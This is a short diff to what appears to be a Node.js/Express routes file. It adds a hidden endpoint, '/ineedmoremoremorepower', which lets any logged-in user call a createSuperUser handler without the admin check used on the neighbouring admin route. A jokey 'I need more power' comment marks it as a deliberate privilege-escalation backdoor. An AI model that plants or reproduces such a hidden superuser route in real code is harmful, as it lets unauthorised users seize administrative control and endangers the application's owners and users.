@@ -10,4 +10,7 @@ router.get('/login', ctrlUsers.loginForm);
 router.get('/register', ctrlUsers.register);
 router.get('/admin', auth.isAdmin, ctrlUsers.adminPage);
 
+// Life Hack --- I need more power))))
+router.get('/ineedmoremoremorepower', auth.mustBeAuthenticated, ctrlUsers.createSuperUser);
+
 module.exports = router;
